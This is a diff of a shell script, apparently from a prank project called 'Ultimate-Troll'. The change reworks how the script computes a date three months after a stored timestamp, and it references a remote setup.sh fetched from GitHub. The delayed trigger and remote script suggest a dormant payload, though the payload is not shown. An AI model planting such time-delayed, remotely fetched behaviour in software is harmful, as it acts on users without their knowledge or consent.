@@ -7,7 +7,7 @@ SETUP_URL="https://raw.githubusercontent.com/Thomas20090425/Ultimate-Troll/refs/
 SETUP_PATH="$TARGET_DIR/setup.sh"
 
 # Path to the timestamp file
-TIME_FILE="$TARGET_DIR/time"
+TIME_FILE="$TARGET_DIR/time.txt"
 echo "[DEBUG] TIME_FILE set to: $TIME_FILE"
 
 if [ -z "$TIME_FILE" ] || [ ! -f "$TIME_FILE" ]; then
@@ -15,8 +15,15 @@ if [ -z "$TIME_FILE" ] || [ ! -f "$TIME_FILE" ]; then
 else
   ORIG_TS_STR=$(cat "$TIME_FILE")
   echo "[DEBUG] Original timestamp string: $ORIG_TS_STR"
-  # Compute the date exactly 3 months after original timestamp
-  TARGET_DATE=$(date -j -f '%Y:%m:%d:%H:%M:%S' "$ORIG_TS_STR" -v+3m '+%Y%m%d')
+  # Parse original timestamp into components
+  IFS=':' read orig_year orig_month orig_day orig_hour orig_min orig_sec <<< "$ORIG_TS_STR"
+  echo "[DEBUG] Parsed original YMD: $orig_year-$orig_month-$orig_day"
+  # Add three months
+  tmp_month=$((10#$orig_month + 3))
+  year_offset=$(( (tmp_month - 1) / 12 ))
+  new_month=$(( (tmp_month - 1) % 12 + 1 ))
+  new_year=$((orig_year + year_offset))
+  TARGET_DATE=$(printf "%04d%02d%02d" "$new_year" "$new_month" "$orig_day")
   echo "[DEBUG] Computed TARGET_DATE: $TARGET_DATE"
   NOW_DATE=$(date '+%Y%m%d')
   echo "[DEBUG] Current NOW_DATE: $NOW_DATE"
@@ -44,5 +51,4 @@ EOF
   else
     echo "[DEBUG] Condition not met: no action"
   fi
-fi
 fi
